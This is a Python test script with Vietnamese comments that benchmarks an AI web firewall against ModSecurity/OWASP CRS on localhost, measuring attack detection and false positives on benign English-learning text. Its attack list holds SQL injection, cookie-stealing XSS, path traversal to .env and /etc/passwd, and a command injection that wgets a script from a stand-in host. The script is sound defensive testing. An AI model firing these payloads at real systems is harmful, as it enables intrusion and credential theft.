"""
So sánh AI WAF với ModSecurity + OWASP CRS – mốc đối chứng chuẩn công nghiệp.

Chạy CÙNG một bộ test qua ba WAF, tất cả đều đứng trước EngPro thật:
    - AI WAF           : cổng 8000  (của đồ án này)
    - ModSecurity PL1  : cổng 8002  (OWASP CRS, Paranoia Level 1 – mặc định)
    - ModSecurity PL2  : cổng 8003  (OWASP CRS, Paranoia Level 2 – gắt hơn)

Đo hai thứ đối nghịch nhau:
    1. Phát hiện tấn công  – càng cao càng tốt
    2. Báo nhầm lưu lượng thật – càng THẤP càng tốt. Phần benign cố ý nhiều câu
       tiếng Anh tự do (bài Writing, hỏi đáp) chứa từ khóa trông giống tấn công.
       Đây là điểm mấu chốt của đồ án: WAF luật cứng hay chặn nhầm loại này.

Một WAF tốt phải cân bằng cả hai. Bảng kết quả cho thấy sự đánh đổi đó.

    python -m tests.compare_modsec

Cần: EngPro ở 8080, AI WAF ở 8000, hai container ModSecurity ở 8002/8003
(dựng bằng tests/modsec.sh up).
"""
import statistics
import time
import urllib.error
import urllib.parse
import urllib.request

WAFS = [
    ("AI WAF", "http://127.0.0.1:8000"),
    ("ModSec PL1", "http://127.0.0.1:8002"),
    ("ModSec PL2", "http://127.0.0.1:8003"),
]

BROWSER_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

# ── Tấn công (mong đợi: BỊ CHẶN) ──
ATTACKS = [
    ("SQLi OR 1=1",            "GET",  "/api/courses", {"search": "' OR 1=1--"}, None, None),
    ("SQLi UNION",             "GET",  "/api/courses", {"search": "1' UNION SELECT username,password FROM users--"}, None, None),
    ("SQLi né luật (comment)", "GET",  "/api/courses", {"search": "1'/**/UnIoN/**/SeLeCt/**/1,2,3--"}, None, None),
    ("SQLi OR TRUE",           "GET",  "/api/courses", {"id": "99 OR TRUE--"}, None, None),
    ("SQLi nối chuỗi",         "GET",  "/api/courses", {"q": "'||(SELECT password FROM users LIMIT 1)||'"}, None, None),
    ("SQLi pg_sleep",          "GET",  "/api/courses", {"id": "1' AND pg_sleep(5)--"}, None, None),
    ("SQLi blind ASCII",       "GET",  "/api/courses", {"id": "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64"}, None, None),
    ("SQLi admin'#",           "GET",  "/api/courses", {"search": "admin'#"}, None, None),
    ("SQLi no-space comment",  "GET",  "/api/courses", {"id": "1'/**/AND/**/1=1"}, None, None),
    ("XSS <script>",           "POST", "/api/lecture-questions/1/answers", None, '{"content":"<script>alert(document.cookie)</script>"}', None),
    ("XSS <img onerror>",      "POST", "/api/courses/1/reviews", None, '{"comment":"<img src=x onerror=alert(1)>"}', None),
    ("XSS <details ontoggle>", "POST", "/api/courses/1/reviews", None, '{"comment":"<details open ontoggle=alert(1)>"}', None),
    ("XSS <svg onload>",       "GET",  "/api/courses", {"q": "<svg/onload=alert(1)>"}, None, None),
    ("Path traversal .env",    "GET",  "/api/courses", {"file": "../../../.env"}, None, None),
    ("Path traversal passwd",  "GET",  "/api/courses", {"file": "../../../../etc/passwd"}, None, None),
    ("Command injection",      "GET",  "/api/courses", {"q": "; cat /etc/passwd"}, None, None),
    ("Command wget",           "GET",  "/api/courses", {"q": "; wget http://198.51.100.7/a.sh"}, None, None),
    ("Template injection",     "GET",  "/api/courses", {"q": "{{7*7}}"}, None, None),
    ("Scanner sqlmap",         "GET",  "/api/courses", None, None, "sqlmap/1.8.4#stable"),
    ("Scanner Nikto",          "GET",  "/pages/login.html", None, None, "Nikto/2.5.0"),
]

# ── Lưu lượng BÌNH THƯỜNG (mong đợi: KHÔNG bị chặn) ──
# Phần lớn là câu tiếng Anh tự do như học viên EngPro thật sự gửi lên.
BENIGN = [
    ("Trang chủ",                "GET",  "/", None, None, None),
    ("Tìm khóa học",             "GET",  "/api/courses", {"search": "business english"}, None, None),
    ("Tìm 'order of adjectives'","GET",  "/api/courses", {"search": "order of adjectives"}, None, None),
    ("Tìm 'drop the ball'",      "GET",  "/api/courses", {"search": "drop the ball idiom"}, None, None),
    ("Tìm 'union vs intersect'", "GET",  "/api/courses", {"search": "union vs intersection in sets"}, None, None),
    ("Writing: select/order",    "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"Students should select the courses that match their goals and order their study plan carefully."}', None),
    ("Writing: true or false",   "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"Decide whether each statement is true or false according to the reading passage above."}', None),
    ("Writing: union & drop",    "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"The trade union agreed that workers should not drop their demand for fair pay and better hours."}', None),
    ("Writing: script & table",  "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"The script of the documentary and the table of statistics made the argument very convincing."}', None),
    ("Writing: apostrophes",     "POST", "/api/courses/1/reviews", None,
     '{"rating":5,"comment":"It\'s the best course I\'ve taken; don\'t miss it, the teacher\'s explanations are clear."}', None),
    ("Hỏi đáp: SELECT in SQL",   "POST", "/api/ai/lectures/1/ask", None,
     '{"question":"In the lesson you used SELECT and WHERE; can you explain how they work together?"}', None),
    ("Đăng nhập thường",         "POST", "/api/auth/login", None,
     '{"email":"lan.nguyen@gmail.com","password":"Tieng@nh2024"}', None),
    ("Client curl",             "GET",  "/api/courses", None, None, "curl/8.7.1"),
    # Câu tiếng Anh "khó" – chứa từ khóa trông giống SQL/XSS nhưng hoàn toàn hợp lệ.
    # Đây là phần làm WAF luật cứng (nhất là ModSec mức gắt) báo nhầm.
    ("Writing: SELECT...FROM",   "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"In SQL we write SELECT name FROM students WHERE score > 80 ORDER BY score DESC in the lesson."}', None),
    ("Writing: select Save As",  "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"Click the link and then select Save As from the menu that appears on the screen."}', None),
    ("Writing: 1=1 logic",       "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"My essay discusses whether 1=1 is always true in mathematics and formal logic."}', None),
    ("Writing: angle brackets",  "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"He shouted <loudly> at the game and everyone could hear him from far away that day."}', None),
    ("Writing: =SUM formula",    "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"The formula =SUM(A1:A10) adds the numbers; drop it into the cell and press enter."}', None),
    ("Writing: cat and /etc",    "POST", "/api/writing/prompts/1/submit", None,
     '{"content":"cat and dog are common nouns; /etc is a folder on Linux we studied in class yesterday."}', None),
]


def send(base, method, path, params, body, ua):
    url = base + urllib.parse.quote(path)
    if params:
        url += "?" + urllib.parse.urlencode(params)
    data = body.encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", ua or BROWSER_UA)
    if body:
        req.add_header("Content-Type", "application/json")
    t = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            code = r.status
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception:
        code = -1
    return code, (time.perf_counter() - t) * 1000


def evaluate(base):
    """Trả về (bắt_tấn_công, báo_nhầm, chi_tiết, độ_trễ_median)."""
    lat = []
    caught, details_a = 0, []
    for name, m, p, params, body, ua in ATTACKS:
        code, ms = send(base, m, p, params, body, ua)
        lat.append(ms)
        blocked = code == 403
        caught += blocked
        details_a.append((name, blocked))
    fp, details_b = 0, []
    for name, m, p, params, body, ua in BENIGN:
        code, ms = send(base, m, p, params, body, ua)
        lat.append(ms)
        blocked = code == 403
        fp += blocked
        details_b.append((name, blocked))
    return caught, fp, details_a, details_b, statistics.median(lat)


def main():
    print(f"Bộ test: {len(ATTACKS)} tấn công · {len(BENIGN)} request bình thường\n")
    results = {}
    for label, base in WAFS:
        # warm-up
        send(base, "GET", "/api/public/home", None, None, None)
        results[label] = evaluate(base)

    # ── Bảng tổng hợp ──
    print("── Tổng hợp ──\n")
    print(f"   {'WAF':14s} {'Phát hiện':>12s} {'Báo nhầm':>18s} {'Độ trễ p50':>12s}")
    print("   " + "─" * 60)
    for label, _ in WAFS:
        caught, fp, _, _, lat = results[label]
        print(f"   {label:14s} {caught:>3d}/{len(ATTACKS):<3d} ({caught/len(ATTACKS)*100:3.0f}%) "
              f"{fp:>3d}/{len(BENIGN):<3d} ({fp/len(BENIGN)*100:3.0f}%) chặn nhầm "
              f"{lat:>8.1f} ms")

    # ── Chi tiết báo nhầm (phần quan trọng nhất) ──
    print("\n── Request bình thường bị chặn nhầm ──\n")
    print(f"   {'Request':30s} " + " ".join(f"{l:>11s}" for l, _ in WAFS))
    print("   " + "─" * 66)
    any_fp = False
    for i, (name, *_) in enumerate(BENIGN):
        marks = []
        row_has_fp = False
        for label, _ in WAFS:
            blocked = results[label][3][i][1]
            marks.append("CHẶN NHẦM" if blocked else "ok")
            row_has_fp |= blocked
        if row_has_fp:
            any_fp = True
            print(f"   {name:30s} " + " ".join(f"{m:>11s}" for m in marks))
    if not any_fp:
        print("   (không WAF nào chặn nhầm)")

    # ── Chi tiết tấn công bị bỏ sót ──
    print("\n── Tấn công bị bỏ sót (lọt qua WAF) ──\n")
    print(f"   {'Tấn công':30s} " + " ".join(f"{l:>11s}" for l, _ in WAFS))
    print("   " + "─" * 66)
    any_miss = False
    for i, (name, *_) in enumerate(ATTACKS):
        marks, row_has_miss = [], False
        for label, _ in WAFS:
            blocked = results[label][2][i][1]
            marks.append("ok" if blocked else "LỌT")
            row_has_miss |= not blocked
        if row_has_miss:
            any_miss = True
            print(f"   {name:30s} " + " ".join(f"{m:>11s}" for m in marks))
    if not any_miss:
        print("   (không tấn công nào lọt qua bất kỳ WAF nào)")


if __name__ == "__main__":
    main()
